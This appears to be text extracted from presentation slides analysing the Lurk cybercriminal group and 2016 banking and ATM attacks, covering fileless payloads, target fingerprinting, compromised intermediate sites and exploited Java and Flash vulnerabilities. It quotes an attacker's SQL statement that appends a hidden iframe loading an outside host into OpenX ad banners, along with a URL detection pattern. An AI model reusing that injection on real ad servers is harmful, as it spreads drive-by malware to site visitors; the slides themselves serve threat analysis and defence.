Incidents of Interest in 2016
 Swift breaches  ATM attacks

ATM breach japan
 Cards using data dumps

ATM breach Taiwan
 Very well known.. skip :)

less known cases

ATM breaches in Kyrgyzstan

ATM breaches in Tajikistan

Possible attack vectors

Attack vectors in Banking Infrastructure

Traditional: bank customers
 Online banking. Well developed, targeted by a number of malware families. Getting very advanced (bypassing one time passwords)
 Cards (credit/debit). Skimmers. Been around for a while

Should not forget the principle of ..

Issues with Bank networks
 "Shell" structure: hard outside, soft inside  Often poor segmentation within internal network  Complexity of legacy applications  Complexity of relationships with 3rd party business
partners, maintenance and support (TeamViewer into a backend system, anyone? ;))

Why only now..?
 Banking networks: step learning curve for an attacker. (observation: in a breach of a bank in Singapore in 2001, had password collecting software installed on online banking web server
 Attackers were only _THAT_ smart

and then we had this..

How it started... early days of Lurk

A quick intro
Where did the data come from? What did we see?
What we didn't see :-)

Lurk timeline in "nutshell"
 The Lurk - early observations in 2011, 2012  The Lurk - becoming extremely active, attacking .RU segment of Internet  The Lurk - upgrading infrastructure  A blog post about "fileless" appears securelist.com  Lurk - going global  Lurk is given attention by Kaffeine (of malwaredontneedcoffee famous blog)  Lurk is given attention by CISCO TALOS security team  Microsoft discussed flash zero day exploited by the Lurk (https://blogs.technet.microsoft.com/mmpc/2014/02/10/a-
journey-to-cve-2013-5330-exploit/)  The securelist.com publishes multiple public reports(s) about Lurk activity  BOOM ka-BOOM! - the Lurk group is being busted (50 people arrested)  The securelist.com publishes "post-mortem" report

the First observation of Lurk

Other Basic definitions
 What is drive-by (anyone?)  What is `landing'  exploit vs payload  Understanding intermediate victims and `watering hole'
attacks

Bodiless or fileless payload
Lurk was the first criminal web exploitation group to use bodiless/fileless non-persistent payload in exploit chain.
Multi-staged payload delivery:
Lurk used initial non-persistent payload which probed the target of interest before making decision if any additional payload needs to be served.

A magic pattern :-)
 This URL signature proved itself to be very effective for Lurk URL detection at its early stages
 ^[A-Z0-9]{4}$

The pattern at work
Surprisingly the pattern worked very well

Lurk target fingerprinting
Lurk only served additional stages of multi-staged malware, if initial analysis of compromised target confirmed it to be a target of interest.

Lurk Exploitation Tactics

Main Attack Vectors
텱rive-by THROUGH direct compromise 텱rive-by THROUGH programmatic advertising platforms (ad networks) compromise 톁oftware distribution package tampering

intermediate victim, site 1
톗emcached Cache poisoning Observed: continuous flood of connection requests to TCP 11211 (default memcached port) Cached pages were updated with `iframed' versions of these pages on the fly

intermediate victim, site 2
Machine was compromised via an ssh vulnerability
Apache web server had additional module installed: mod_proxy_mysql.so (didn't link any mysql libraries)
This is possibly a modified version of http://pastebin.com/raw/6wWVsstj as reported by succuri (https://blog.sucuri.net/2013/01/server-side-iframe-injectionsvia-apache-modules-and-sshd-backdoor.html)

Intermediate victim, site #3
OpenX compromise  webshell installed  The Lurk group periodically modified banners table with
update `banners` set htmltemplate=concat(htmltemplate, '<script>document.write(\'<div style="position:absolute;left:1000px;top:-1280px;">
<iframe src="http://couldvestuck.org/XZAH"></iframe></div>\'); </script>') where storagetype='html'
This causes the OpenX script `/www/delivery/ajs.php' to produce the HTML code with this iframe snippet appearing at the page.

Distribution timings
General technique:  Serve exploit payload only when a potential victim is likely
to visit watering hole website.  Return redirect to google.com otherwise

Lurk - active hours

Lurk distribution by day o f week

Lurk Exploits and Payloads

Lurk exploits
Lurk's favourite: JAVA CVE-2011-3544 Use of Flash payload for target fingerprinting Using flash CVE-20135330 exploit
